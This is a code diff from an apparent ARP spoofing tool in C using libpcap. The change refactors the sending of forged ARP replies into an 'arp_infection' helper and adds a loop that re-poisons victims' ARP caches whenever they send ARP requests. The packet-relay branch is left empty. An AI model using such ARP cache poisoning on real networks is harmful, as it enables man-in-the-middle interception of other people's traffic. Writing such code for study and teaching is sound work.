@@ -60,18 +60,36 @@ int main(int argc, char* argv[])
 	
 	// first infection
 	for(int i = 0; i < sess_cnt; i++) 
-	{	
-		make_arp(send_pkt, my_mac, ip2mac[sess[i].send_ip], 
-			 ARP_REPLY, my_mac, (uint8_t*)&sess[i].tar_ip, 
-			 ip2mac[sess[i].send_ip], (uint8_t*)&sess[i].send_ip);
-		pcap_sendpacket(handle, send_pkt, ARP_PACKET_SIZE);
-	}
+		arp_infection(sess[i]);
 
-	// relay & recovery detection
+	// ip packet relay & recovery detection
 	while (true) 
 	{
 		int res = pcap_next_ex(handle, &header, &recv_pkt);
 		if (res == 0) continue;
 		if (res == -1 || res == -2) break;
+		ether_header *ethhdr = (ether_header*)recv_pkt;
+		
+		for(int i = 0; i < sess_cnt; i++)
+		{
+			if(!memcmp(ip2mac[sess[i].send_ip], ethhdr->src_mac, 6))
+			{
+				// packet relay
+				if(ethhdr->ether_type == htons(ETHERTYPE_IP))
+				{
+
+				}
+				// recovery detection
+				else if(ethhdr->ether_type == htons(ETHERTYPE_ARP))
+				{
+					arp_header *arphdr = (arp_header*)(recv_pkt + sizeof(ether_header));
+					if((arphdr->op == htons(ARP_REQUEST)) && 
+					   (!memcmp(arphdr->tar_ip, (uint8_t*)&sess[i].tar_ip, 4)))
+							arp_infection(sess[i]);
+				}
+						
+				break;
+			}
+		}
 	}
 }
